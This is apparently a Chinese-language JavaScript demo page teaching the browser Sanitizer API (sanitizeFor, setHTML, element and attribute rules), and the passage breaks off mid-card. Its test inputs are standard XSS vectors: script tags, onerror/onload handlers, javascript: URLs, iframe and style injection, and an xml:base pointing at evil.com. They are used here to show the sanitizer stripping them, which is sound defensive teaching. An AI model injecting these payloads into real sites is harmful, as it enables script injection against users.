  _runSanitizeForDemo() {
    const f = this._flags();
    this._injectStyle('san-sanitizefor-demo', `
      .san-sanitizefor-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);

    // 测试用例：覆盖典型 XSS 向量
    const testCases = [
      {
        name: 'script 标签',
        input: '<script>alert(1)</script>hello',
        expectedTag: 'div',
      },
      {
        name: 'on* 事件属性',
        input: '<img src=x onerror=alert(1)>',
        expectedTag: 'div',
      },
      {
        name: 'javascript: URL',
        input: '<a href="javascript:alert(1)">click</a>',
        expectedTag: 'div',
      },
      {
        name: 'iframe 注入',
        input: '<iframe src="javascript:alert(1)"></iframe>',
        expectedTag: 'div',
      },
      {
        name: 'svg onload',
        input: '<svg onload=alert(1)><circle cx=50 cy=50 r=40/></svg>',
        expectedTag: 'div',
      },
      {
        name: 'style 标签注入',
        input: '<style>@import "javascript:alert(1)";</style>',
        expectedTag: 'div',
      },
      {
        name: '正常富文本',
        input: '<p>Hello <b>world</b>! <a href="https://example.com">link</a></p>',
        expectedTag: 'div',
      },
      {
        name: '嵌套 + 自闭合',
        input: '<div><span>text</span><br><img src="a.png" alt="img"></div>',
        expectedTag: 'div',
      },
    ];

    let resultLines = [];
    let sanitizeResult = '';

    if (!f.sanitizeForStatic) {
      // 降级：用 DOMParser 手动净化演示概念
      resultLines = [
        '===== Sanitizer.sanitizeFor 静态方法（降级演示）=====',
        '',
        '⚠ 当前环境 Sanitizer.sanitizeFor 不可用，使用 DOMParser + 白名单手动净化做演示',
        '',
        '【API 签名（spec）】',
        '  // 静态方法，返回指定 tag 的 Element',
        '  Sanitizer.sanitizeFor(tag: string, html: string): Element',
        '',
        '  // 用 default sanitize mode（new Sanitizer() 的默认配置）',
        '  // 1. 浏览器内部用 HTML parser 解析 html 字符串',
        '  // 2. 按 default config 移除危险节点（script, on*, javascript:）',
        '  // 3. 包装到 <tag>...</tag> 中，返回该 Element',
        '',
        '【示例】',
        "  const cleanEl = Sanitizer.sanitizeFor('div', userInputHtml);",
        '  console.log(cleanEl.tagName);          // "DIV"',
        '  console.log(cleanEl.innerHTML);        // 已净化的 HTML',
        '  document.body.appendChild(cleanEl);    // 安全插入',
        '',
        '【与 setHTML 的关系】',
        '  // 等价于：',
        '  const tmp = document.createElement(tag);',
        '  tmp.setHTML(html);   // 不传 sanitizer 用默认',
        '  return tmp;',
        '',
        '  // 区别：',
        '  // - sanitizeFor 是「净化后返回新 Element」，需手动 appendChild',
        '  // - setHTML 是「直接净化并写入已存在 Element」，一步到位',
        '  // - sanitizeFor 适合：净化后插入到任意位置 / 多次插入 / 测试净化结果',
        '  // - setHTML 适合：替换某容器的 innerHTML（典型评论列表场景）',
        '',
        '【降级演示：用 DOMParser 手动实现等价 sanitizeFor】',
      ];

      if (!f.domParser || typeof DOMParser === 'undefined') {
        resultLines.push('  DOMParser 也不可用，无法降级演示。仅展示文本说明。');
        sanitizeResult = 'Sanitizer.sanitizeFor 与 DOMParser 均不可用，仅文本说明';
      } else {
        // 手动白名单净化（教学，非生产可用）
        const ALLOWED_TAGS = new Set([
          'div', 'p', 'span', 'b', 'i', 'em', 'strong', 'code', 'pre',
          'blockquote', 'ul', 'ol', 'li', 'a', 'img', 'br', 'hr',
          'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        ]);
        const ALLOWED_ATTRS = {
          '*': ['class', 'id'],
          a: ['href', 'title', 'target', 'rel'],
          img: ['src', 'alt', 'width', 'height'],
        };
        const SAFE_URL_RE = /^(https?:|mailto:|tel:|data:image\/|\/|\.\/|\.\.\/|#)/i;

        const parser = new DOMParser();
        for (const tc of testCases) {
          try {
            const doc = parser.parseFromString(`<${tc.expectedTag}>${tc.input}</${tc.expectedTag}>`, 'text/html');
            const root = doc.body.firstElementChild;
            // 手动遍历移除危险元素和属性
            const walkAndClean = (node) => {
              const children = Array.from(node.children);
              for (const child of children) {
                const tag = child.tagName.toLowerCase();
                if (!ALLOWED_TAGS.has(tag) && tag !== tc.expectedTag) {
                  // 移除元素，但保留子节点（block 行为）
                  while (child.firstChild) node.insertBefore(child.firstChild, child);
                  node.removeChild(child);
                  continue;
                }
                // 过滤属性
                for (const attr of Array.from(child.attributes)) {
                  const attrName = attr.name.toLowerCase();
                  const attrValue = attr.value;
                  const allowedForTag = ALLOWED_ATTRS[tag] || [];
                  const allowedForAll = ALLOWED_ATTRS['*'] || [];
                  const allowed = allowedForTag.includes(attrName) || allowedForAll.includes(attrName);
                  if (!allowed || attrName.startsWith('on')) {
                    child.removeAttribute(attr.name);
                    continue;
                  }
                  if ((attrName === 'href' || attrName === 'src') && !SAFE_URL_RE.test(attrValue)) {
                    child.removeAttribute(attr.name);
                  }
                }
                walkAndClean(child);
              }
            };
            walkAndClean(root);
            const cleaned = root.innerHTML;
            resultLines.push(`  [${tc.name}]`);
            resultLines.push(`    输入: ${tc.input}`);
            resultLines.push(`    净化: ${cleaned || '(空)'}  ← ${tc.expectedTag}`);
            resultLines.push('');
          } catch (err) {
            resultLines.push(`  [${tc.name}] 降级解析失败：${err.message}`);
          }
        }
        sanitizeResult = 'DOMParser 降级演示完成（仅教学，非生产可用 Sanitizer）';
      }

      resultLines.push('', '【实际能力检测结果】', `  Sanitizer.sanitizeFor: ${f.sanitizeForStatic ? '✓' : '✗'}`);
      this._addLog('warn', 'Sanitizer.sanitizeFor 不可用，降级使用 DOMParser + 白名单演示概念（仅教学）');
    } else {
      // 真实运行 sanitizeFor
      try {
        for (const tc of testCases) {
          const cleanEl = Sanitizer.sanitizeFor(tc.expectedTag, tc.input);
          resultLines.push(`  [${tc.name}]`);
          resultLines.push(`    输入: ${tc.input}`);
          resultLines.push(`    净化: ${cleanEl.outerHTML}`);
          resultLines.push(`    tagName: ${cleanEl.tagName}`);
          resultLines.push('');
        }
        sanitizeResult = 'Sanitizer.sanitizeFor 真实运行成功';
        this._addLog('info', 'Card 3：sanitizeFor 真实运行成功');
      } catch (err) {
        resultLines = [
          '===== Sanitizer.sanitizeFor 运行失败 =====',
          '',
          `错误：${err.name} - ${err.message}`,
          '',
          '可能原因：',
          '  1. Sanitizer spec 变更，sanitizeFor 签名变化',
          '  2. tag 参数非合法 HTML 标签名',
          '',
        ];
        sanitizeResult = `sanitizeFor 运行失败：${err.name} - ${err.message}`;
        this._addLog('error', `sanitizeFor 运行失败：${err.name} - ${err.message}`);
      }
    }

    this.setState({
      sanitizeForInfo: resultLines.join('\n'),
      sanitizeForResult: sanitizeResult,
    });
  }

  _renderCard3() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '3. sanitizeFor 静态方法 —— Sanitizer.sanitizeFor(tag, html) / 返回 Element',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['sanitizeFor', f.sanitizeForStatic],
          ['DOMParser(降级)', f.domParser],
        ]),
        h(Tag, { color: 'primary' }, '静态'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          'Sanitizer.sanitizeFor(tag, htmlString) 静态方法：解析 + 净化 HTML 字符串，返回指定 tag 的 Element（不传 sanitizer 时用 default sanitize mode）。与 setHTML 区别：sanitizeFor 返回新 Element 需手动 appendChild，适合插入到任意位置 / 多次插入 / 测试净化结果；setHTML 直接写入已存在 Element，适合替换容器内容（典型评论列表场景）。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行 sanitizeFor 演示', { type: 'primary', size: 'sm', onClick: () => this._runSanitizeForDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// 静态方法：净化一段 HTML，返回指定 tag 的 Element
const cleanEl = Sanitizer.sanitizeFor('div', userInputHtml);
// cleanEl.tagName === 'DIV'
// cleanEl.innerHTML 已被净化（移除 script/on*/javascript:）

// 安全插入到 DOM 任意位置
document.body.appendChild(cleanEl);

// 测试用例覆盖典型 XSS 向量
const tests = [
  '<script>alert(1)</script>hello',
  '<img src=x onerror=alert(1)>',
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<svg onload=alert(1)><circle cx=50 cy=50 r=40/></svg>',
  '<style>@import "javascript:alert(1)";</style>',
];

for (const html of tests) {
  const el = Sanitizer.sanitizeFor('div', html);
  console.log(html, '→', el.innerHTML);
}

// 与 setHTML 等价关系
const div = document.createElement('div');
div.setHTML(html);  // 等价：sanitizeFor 后 appendChild`)),
        h('div', { class: 'fs-sm text-secondary' }, '净化结果（含 XSS 向量测试）：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.sanitizeForInfo || '（点击按钮查看 sanitizeFor 净化结果）')),
        s.sanitizeForResult ? h('div', { class: 'san-output san-output--success' }, s.sanitizeForResult) : null,
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 4：setHTML 实例方法 =====================

  _runSetHTMLDemo() {
    const f = this._flags();
    this._injectStyle('san-sethtml-demo', `
      .san-sethtml-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);

    // 测试输入：含多种 XSS 向量 + 正常富文本
    const testInput = [
      '<p>正常段落 <b>加粗</b> <i>斜体</i></p>',
      '<script>alert("XSS via script")</script>',
      '<img src="x" onerror="alert(1)" alt="img">',
      '<a href="javascript:alert(1)">click me</a>',
      '<a href="https://example.com" target="_blank" rel="noopener">safe link</a>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<svg onload="alert(1)"><circle cx="50" cy="50" r="40"/></svg>',
      '<style>body { background: red } /* style injection */</style>',
      '<div class="comment">真实评论内容</div>',
    ].join('\n');

    let resultLines = [];
    let setHTMLResult = '';
    let cleanedHtml = '';

    if (!f.setHTML) {
      // 降级：用 DOMParser + 白名单手动实现等价 setHTML
      resultLines = [
        '===== Element.setHTML（降级演示）=====',
        '',
        '⚠ 当前环境 setHTML 不可用，使用 DOMParser + 白名单手动净化做演示',
        '',
        '【API 签名（spec）】',
        '  element.setHTML(html: string, options?: { sanitizer?: Sanitizer }): undefined',
        '',
        '  // 不传 sanitizer：使用 default sanitize mode（new Sanitizer() 的默认配置）',
        '  container.setHTML(userInputHtml);',
        '',
        '  // 传入自定义 sanitizer',
        '  const sanitizer = new Sanitizer({',
        "    allowElements: ['div', 'p', 'b', 'i', 'a'],",
        "    dropAttributes: { '*': ['on*'] },",
        '  });',
        '  container.setHTML(userInputHtml, { sanitizer });',
        '',
        '【与 innerHTML 对比】',
        '  维度              innerHTML                    setHTML',
        '  ------------------------------------------------------------------',
        '  解析              浏览器 HTML parser            浏览器 HTML parser',
        '  净化              ✗ 无                         ✓ 按 sanitizer 配置',
        '  执行 <script>     ✗ 解析为 script 节点不执行   ✓ 移除 script 节点',
        '  on* 事件属性      ✓ 保留（点击触发）           ✓ 移除',
        '  javascript: URL   ✓ 保留                       ✓ 移除（href 改为 # 或移除属性）',
        '  <iframe>          ✓ 保留并加载                  ✓ 移除',
        '  <style>           ✓ 保留并应用                  ✓ 保留（默认允许，drop 可禁用）',
        '  调用次数          1 次解析                      1 次解析（无双重解析开销）',
        '  返回值            undefined                     undefined',
        '  Trusted Types     接受 TrustedHTML              接受 string 或 TrustedHTML',
        '',
        '【测试输入】',
        testInput,
        '',
        '【降级演示：DOMParser + 白名单手动实现】',
      ];

      if (!f.domParser || typeof DOMParser === 'undefined') {
        resultLines.push('  DOMParser 也不可用，无法降级演示。仅展示文本说明。');
        setHTMLResult = 'setHTML 与 DOMParser 均不可用，仅文本说明';
      } else {
        const ALLOWED_TAGS = new Set([
          'div', 'p', 'span', 'b', 'i', 'em', 'strong', 'code', 'pre',
          'blockquote', 'ul', 'ol', 'li', 'a', 'img', 'br', 'hr',
          'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        ]);
        const ALLOWED_ATTRS = {
          '*': ['class'],
          a: ['href', 'title', 'target', 'rel'],
          img: ['src', 'alt', 'width', 'height'],
        };
        const SAFE_URL_RE = /^(https?:|mailto:|tel:|data:image\/|\/|\.\/|\.\.\/|#)/i;

        const parser = new DOMParser();
        try {
          const doc = parser.parseFromString(`<div>${testInput}</div>`, 'text/html');
          const root = doc.body.firstElementChild;

          const walkAndClean = (node) => {
            for (const child of Array.from(node.children)) {
              const tag = child.tagName.toLowerCase();
              if (!ALLOWED_TAGS.has(tag)) {
                while (child.firstChild) node.insertBefore(child.firstChild, child);
                node.removeChild(child);
                continue;
              }
              for (const attr of Array.from(child.attributes)) {
                const attrName = attr.name.toLowerCase();
                const attrValue = attr.value;
                const allowedForTag = ALLOWED_ATTRS[tag] || [];
                const allowedForAll = ALLOWED_ATTRS['*'] || [];
                const allowed = allowedForTag.includes(attrName) || allowedForAll.includes(attrName);
                if (!allowed || attrName.startsWith('on')) {
                  child.removeAttribute(attr.name);
                  continue;
                }
                if ((attrName === 'href' || attrName === 'src') && !SAFE_URL_RE.test(attrValue)) {
                  child.removeAttribute(attr.name);
                }
              }
              walkAndClean(child);
            }
          };
          walkAndClean(root);
          cleanedHtml = root.innerHTML;

          resultLines.push(`  净化后 HTML：`);
          resultLines.push(`    ${cleanedHtml || '(空)'}`);
          resultLines.push('');
          resultLines.push('  逐项检查：');
          resultLines.push(`    <script> → ${cleanedHtml.includes('<script') ? '✗ 仍存在' : '✓ 已移除'}`);
          resultLines.push(`    onerror → ${cleanedHtml.includes('onerror') ? '✗ 仍存在' : '✓ 已移除'}`);
          resultLines.push(`    javascript: → ${cleanedHtml.includes('javascript:') ? '✗ 仍存在' : '✓ 已移除'}`);
          resultLines.push(`    <iframe> → ${cleanedHtml.includes('<iframe') ? '✗ 仍存在' : '✓ 已移除'}`);
          resultLines.push(`    <svg onload → ${cleanedHtml.includes('onload') ? '✗ 仍存在' : '✓ 已移除'}`);
          resultLines.push(`    <style> → ${cleanedHtml.includes('<style') ? '保留（白名单允许）' : '✓ 已移除'}`);
          resultLines.push(`    正常 <p>/<b>/<i>/<a> → ${/\<p\>.*\<b\>/.test(cleanedHtml) ? '✓ 保留' : '✗ 异常'}`);
        } catch (err) {
          resultLines.push(`  DOMParser 降级解析失败：${err.name} - ${err.message}`);
        }
        setHTMLResult = 'DOMParser 降级演示完成（仅教学，非生产可用 Sanitizer）';
      }

      resultLines.push('', '【实际能力检测结果】', `  Element.setHTML: ${f.setHTML ? '✓' : '✗'}`);
      this._addLog('warn', 'Element.setHTML 不可用，降级使用 DOMParser + 白名单演示概念（仅教学）');
    } else {
      // 真实运行 setHTML
      try {
        // 测试 1：默认配置（不传 sanitizer）
        const container1 = document.createElement('div');
        container1.setHTML(testInput);
        const defaultResult = container1.innerHTML;

        // 测试 2：自定义 sanitizer
        let customResult = '';
        let sanitizer = null;
        try {
          sanitizer = new Sanitizer({
            allowElements: ['div', 'p', 'b', 'i', 'a', 'img'],
            dropElements: ['script', 'iframe', 'style', 'svg'],
            dropAttributes: { '*': ['on*'] },
          });
        } catch (err) {
          sanitizer = null;
        }
        const container2 = document.createElement('div');
        if (sanitizer) {
          container2.setHTML(testInput, { sanitizer });
          customResult = container2.innerHTML;
        } else {
          customResult = '(自定义 Sanitizer 创建失败)';
        }

        resultLines = [
          '===== Element.setHTML（真实运行）=====',
          '',
          '✓ 当前环境支持 setHTML，已真实运行净化',
          '',
          '【测试输入】',
          testInput,
          '',
          '【默认配置 setHTML（不传 sanitizer）】',
          defaultResult || '(空)',
          '',
          '【自定义 sanitizer setHTML】',
          customResult || '(空)',
          '',
          '【逐项检查（默认配置）】',
          `  <script> → ${defaultResult.includes('<script') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  onerror → ${defaultResult.includes('onerror') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  javascript: → ${defaultResult.includes('javascript:') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  <iframe> → ${defaultResult.includes('<iframe') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  <svg onload → ${defaultResult.includes('onload') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  <style> → ${defaultResult.includes('<style') ? '保留（默认允许）' : '✓ 已移除'}`,
        ];
        cleanedHtml = defaultResult;
        setHTMLResult = 'Element.setHTML 真实运行成功';
        this._addLog('info', 'Card 4：setHTML 真实运行成功');
      } catch (err) {
        resultLines = [
          '===== Element.setHTML 运行失败 =====',
          '',
          `错误：${err.name} - ${err.message}`,
          '',
        ];
        setHTMLResult = `setHTML 运行失败：${err.name} - ${err.message}`;
        this._addLog('error', `setHTML 运行失败：${err.name} - ${err.message}`);
      }
    }

    this.setState({
      setHTMLInfo: resultLines.join('\n'),
      setHTMLResult,
    });
  }

  _renderCard4() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '4. setHTML 实例方法 —— element.setHTML(html, { sanitizer }) / vs innerHTML',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['setHTML', f.setHTML],
          ['DOMParser(降级)', f.domParser],
        ]),
        h(Tag, { color: 'primary' }, '实例'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          'element.setHTML(html, { sanitizer }) 原生方法：替代 innerHTML，浏览器内部完成 HTML 解析 + 净化 + 赋值一步到位。不传 sanitizer 时用 default sanitize mode（new Sanitizer() 的默认配置）。与 innerHTML 关键差异：setHTML 自动移除 script/on*/javascript: URL/iframe 等危险节点，避免 XSS。调用次数仅 1 次解析（无双重解析开销）。是天然 TrustedHTML sink，与 CSP require-trusted-types-for 协同。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行 setHTML 演示', { type: 'primary', size: 'sm', onClick: () => this._runSetHTMLDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// 危险写法：innerHTML 直接拼接不可信 HTML
container.innerHTML = userInputHtml;  // ⚠ XSS 风险！

// 安全写法 1：默认配置 setHTML（不传 sanitizer）
container.setHTML(userInputHtml);
// 浏览器内部：解析 → 净化（移除 script/on*/javascript:）→ 赋值

// 安全写法 2：自定义 sanitizer
const sanitizer = new Sanitizer({
  allowElements: ['div', 'p', 'b', 'i', 'a', 'img'],
  dropElements: ['script', 'iframe', 'style', 'svg'],
  dropAttributes: { '*': ['on*'] },
});
container.setHTML(userInputHtml, { sanitizer });

// 测试输入：含 XSS 向量
const maliciousInput = \`
  <p>正常 <b>富文本</b></p>
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <a href="javascript:alert(1)">click</a>
  <iframe src="javascript:alert(1)"></iframe>
\`;

container.setHTML(maliciousInput);
console.log(container.innerHTML);
// 输出：<p>正常 <b>富文本</b></p>\n  \n  <img src="x">\n  <a>click</a>\n  
// （script/iframe/onerror/javascript: 均被移除）`)),
        h('div', { class: 'fs-sm text-secondary' }, '净化结果（含 XSS 向量测试 + 逐项检查）：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.setHTMLInfo || '（点击按钮查看 setHTML 净化结果）')),
        s.setHTMLResult ? h('div', { class: 'san-output san-output--success' }, s.setHTMLResult) : null,
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 5：allowElements / blockElements / dropElements =====================

  _runElementsDemo() {
    const f = this._flags();
    this._injectStyle('san-elements-demo', `
      .san-elements-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);

    // 测试输入：含多个元素 + 嵌套子节点
    const testInput = [
      '<div class="outer">',
      '  <p>保留段落</p>',
      '  <span>保留 span</span>',
      '  <script>alert(1)</script>',
      '  <iframe src="javascript:alert(1)">iframe content</iframe>',
      '  <custom-element>自定义元素</custom-element>',
      '  <em>子节点保留测试</em>',
      '</div>',
    ].join('');

    let resultLines = [];
    let elementsResult = '';

    if (!f.sanitizer) {
      // 降级：手动实现三种模式对比
      resultLines = [
        '===== allowElements / blockElements / dropElements（降级演示）=====',
        '',
        '⚠ 当前环境 Sanitizer 不可用，使用 DOMParser + 白名单手动演示三种模式差异',
        '',
        '【三种元素级规则语义】',
        '  allowElements: 白名单。仅保留指定元素，其他元素被「移除」（元素本身',
        '                 移除，但子节点提升到父级，文本不丢）。',
        '  blockElements: 删除指定元素本身，保留其子节点提升到父级',
        '                 （行为与 allowElements 移除元素时相同，但显式声明）。',
        '  dropElements:  黑名单。删除指定元素及其全部子节点（连同内容一起删）。',
        '',
        '【优先级（spec 规定）】',
        '  dropElements > allowElements > blockElements',
        '',
        '  即：',
        '  - dropElements 总是优先：即使 allowElements 包含某元素，dropElements 仍删除它',
        '  - allowElements 与 blockElements 互斥：不能同时包含同元素（行为未定义）',
        '',
        '【测试输入】',
        testInput,
        '',
        '【降级演示：三种模式对比】',
      ];

      if (!f.domParser || typeof DOMParser === 'undefined') {
        resultLines.push('  DOMParser 也不可用，无法降级演示。仅展示文本说明。');
        elementsResult = 'Sanitizer 与 DOMParser 均不可用，仅文本说明';
      } else {
        const parser = new DOMParser();

        const runMode = (mode, list) => {
          try {
            const doc = parser.parseFromString(`<div>${testInput}</div>`, 'text/html');
            const root = doc.body.firstElementChild;
            const walk = (node) => {
              for (const child of Array.from(node.children)) {
                const tag = child.tagName.toLowerCase();
                let shouldDrop = false;
                let shouldStrip = false;
                if (mode === 'allow') {
                  // 仅保留 list 中的元素，其他 strip（保留子节点）
                  if (!list.includes(tag)) shouldStrip = true;
                } else if (mode === 'block') {
                  // strip list 中的元素（保留子节点）
                  if (list.includes(tag)) shouldStrip = true;
                } else if (mode === 'drop') {
                  // drop list 中的元素及其子节点
                  if (list.includes(tag)) shouldDrop = true;
                }
                walk(child);
                if (shouldDrop) {
                  node.removeChild(child);
                } else if (shouldStrip) {
                  while (child.firstChild) node.insertBefore(child.firstChild, child);
                  node.removeChild(child);
                }
              }
            };
            walk(root);
            return root.innerHTML;
          } catch (err) {
            return `解析失败：${err.message}`;
          }
        };

        // 模式 1：allowElements 仅保留 div/p/span
        const allowList = ['div', 'p', 'span'];
        const allowResult = runMode('allow', allowList);
        // 模式 2：blockElements 移除 script/iframe（保留子节点）
        const blockList = ['script', 'iframe', 'custom-element'];
        const blockResult = runMode('block', blockList);
        // 模式 3：dropElements 删除 script/iframe（含子节点）
        const dropList = ['script', 'iframe', 'custom-element'];
        const dropResult = runMode('drop', dropList);

        resultLines.push('  【模式 1：allowElements = [div, p, span]】');
        resultLines.push(`    行为：仅保留 div/p/span，其他元素移除（子节点提升）`);
        resultLines.push(`    结果：${allowResult}`);
        resultLines.push('');
        resultLines.push('  【模式 2：blockElements = [script, iframe, custom-element]】');
        resultLines.push(`    行为：删除 script/iframe/custom 元素本身，子节点保留`);
        resultLines.push(`    结果：${blockResult}`);
        resultLines.push('');
        resultLines.push('  【模式 3：dropElements = [script, iframe, custom-element]】');
        resultLines.push(`    行为：删除 script/iframe/custom 元素及其全部子节点`);
        resultLines.push(`    结果：${dropResult}`);
        resultLines.push('');
        resultLines.push('  【对比：blockElements vs dropElements 差异】');
        resultLines.push(`    blockElements：移除 iframe 元素，但 iframe 文本内容 "iframe content" 保留`);
        resultLines.push(`    dropElements：移除 iframe 元素及 "iframe content" 文本（连同子节点删除）`);
        elementsResult = 'DOMParser 降级演示完成（仅教学）';
      }

      resultLines.push('', '【实际能力检测结果】', `  Sanitizer: ${f.sanitizer ? '✓' : '✗'}`);
      this._addLog('warn', 'Sanitizer 不可用，降级使用 DOMParser 演示三种模式差异（仅教学）');
    } else {
      // 真实运行三种模式
      try {
        const runSanitizer = (config) => {
          const san = new Sanitizer(config);
          const container = document.createElement('div');
          container.setHTML(testInput, { sanitizer: san });
          return container.innerHTML;
        };

        const allowResult = runSanitizer({ allowElements: ['div', 'p', 'span'] });
        const blockResult = runSanitizer({ blockElements: ['script', 'iframe', 'custom-element'] });
        const dropResult = runSanitizer({ dropElements: ['script', 'iframe', 'custom-element'] });

        resultLines = [
          '===== allowElements / blockElements / dropElements（真实运行）=====',
          '',
          '✓ 当前环境支持 Sanitizer，已真实运行三种模式对比',
          '',
          '【测试输入】',
          testInput,
          '',
          '【模式 1：allowElements = [div, p, span]】',
          '  行为：仅保留 div/p/span，其他元素移除（子节点提升）',
          `  结果：${allowResult}`,
          '',
          '【模式 2：blockElements = [script, iframe, custom-element]】',
          '  行为：删除 script/iframe/custom 元素本身，子节点保留',
          `  结果：${blockResult}`,
          '',
          '【模式 3：dropElements = [script, iframe, custom-element]】',
          '  行为：删除 script/iframe/custom 元素及其全部子节点',
          `  结果：${dropResult}`,
          '',
          '【对比：blockElements vs dropElements 差异】',
          `  blockElements：移除 iframe 元素，但 iframe 文本内容 "iframe content" 保留`,
          `  dropElements：移除 iframe 元素及 "iframe content" 文本（连同子节点删除）`,
        ];
        elementsResult = 'Sanitizer 真实运行成功';
        this._addLog('info', 'Card 5：三种元素模式对比运行成功');
      } catch (err) {
        resultLines = [
          '===== 三种元素模式对比运行失败 =====',
          '',
          `错误：${err.name} - ${err.message}`,
        ];
        elementsResult = `运行失败：${err.name} - ${err.message}`;
        this._addLog('error', `三种元素模式对比运行失败：${err.name} - ${err.message}`);
      }
    }

    this.setState({
      elementsInfo: resultLines.join('\n'),
      elementsResult,
    });
  }

  _renderCard5() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '5. allowElements / blockElements / dropElements —— 三者优先级与差异',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['Sanitizer', f.sanitizer],
          ['DOMParser(降级)', f.domParser],
        ]),
        h(Tag, { color: 'primary' }, '元素'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          '三种元素级规则语义：allowElements = 白名单（仅保留指定元素，其他元素移除但子节点提升）；blockElements = 删除指定元素本身，保留子节点提升（行为与 allowElements 移除元素相同，但显式声明）；dropElements = 黑名单（删除元素及其全部子节点，连同内容一起删）。优先级：dropElements > allowElements > blockElements。dropElements 始终生效，即使 allowElements 包含某元素。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行三种模式对比', { type: 'primary', size: 'sm', onClick: () => this._runElementsDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// 测试输入：含 script/iframe/custom-element + 子节点
const input = \`<div class="outer">
  <p>保留段落</p>
  <span>保留 span</span>
  <script>alert(1)</script>
  <iframe src="javascript:alert(1)">iframe content</iframe>
  <custom-element>自定义元素</custom-element>
  <em>子节点保留测试</em>
</div>\`;

// 模式 1：allowElements 仅保留 div/p/span
const san1 = new Sanitizer({ allowElements: ['div', 'p', 'span'] });
container.setHTML(input, { sanitizer: san1 });
// script/iframe/custom/em 元素移除，但 em 内文本 "子节点保留测试" 提升到父级

// 模式 2：blockElements 删除 script/iframe/custom（保留子节点）
const san2 = new Sanitizer({ blockElements: ['script', 'iframe', 'custom-element'] });
container.setHTML(input, { sanitizer: san2 });
// script/iframe/custom 元素移除，子节点（含文本）保留

// 模式 3：dropElements 删除 script/iframe/custom（含子节点）
const san3 = new Sanitizer({ dropElements: ['script', 'iframe', 'custom-element'] });
container.setHTML(input, { sanitizer: san3 });
// script/iframe/custom 元素及子节点全部删除

// 优先级：dropElements > allowElements > blockElements
const san4 = new Sanitizer({
  allowElements: ['div', 'p', 'span', 'iframe'],  // 允许 iframe
  dropElements: ['iframe'],                        // 但又 drop iframe
});
// 结果：iframe 仍被 drop（dropElements 优先级最高）`)),
        h('div', { class: 'fs-sm text-secondary' }, '三种模式对比结果：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.elementsInfo || '（点击按钮查看三种元素模式对比结果）')),
        s.elementsResult ? h('div', { class: 'san-output san-output--success' }, s.elementsResult) : null,
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 6：allowAttributes / dropAttributes =====================

  _runAttributesDemo() {
    const f = this._flags();
    this._injectStyle('san-attributes-demo', `
      .san-attributes-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);

    // 测试输入：含多种属性（普通属性 / on* 事件 / javascript: URL / 命名空间属性）
    const testInput = [
      '<a href="https://safe.com" class="link" id="l1" target="_blank" rel="noopener" onclick="alert(1)">safe link</a>',
      '<a href="javascript:alert(1)" class="x">bad link</a>',
      '<img src="https://safe.com/a.png" alt="img" onerror="alert(1)" width="100" height="50">',
      '<div class="box" data-id="42" data-foo="bar" style="color:red">div</div>',
      '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="javascript:alert(1)"/></svg>',
      '<span xml:lang="en" xml:base="https://evil.com/">ns attrs</span>',
    ].join('');

    let resultLines = [];
    let attributesResult = '';

    if (!f.sanitizer) {
      // 降级：手动演示属性过滤
      resultLines = [
        '===== allowAttributes / dropAttributes（降级演示）=====',
        '',
        '⚠ 当前环境 Sanitizer 不可用，使用 DOMParser + 白名单手动演示属性过滤',
        '',
        '【两种属性级规则语义】',
        '  allowAttributes: 属性白名单。仅保留指定属性，其他属性被移除。',
        '                   key 为元素名或 * 通配符；value 为属性名数组。',
        '  dropAttributes:  属性黑名单。删除指定属性。',
        '                   key 为元素名或 * 通配符；value 为属性名数组。',
        '',
        '【优先级（spec 规定）】',
        '  dropAttributes > allowAttributes',
        '',
        '  即：dropAttributes 始终优先，即使 allowAttributes 包含某属性，dropAttributes 仍删除它',
        '',
        '【通配符匹配规则】',
        "  '*': ['class']      // 所有元素允许 class 属性",
        "  '*': ['on*']        // 通配符：匹配所有 on* 开头的属性（onclick/onerror/onload）",
        "  'a': ['href']       // 仅 a 元素允许 href 属性",
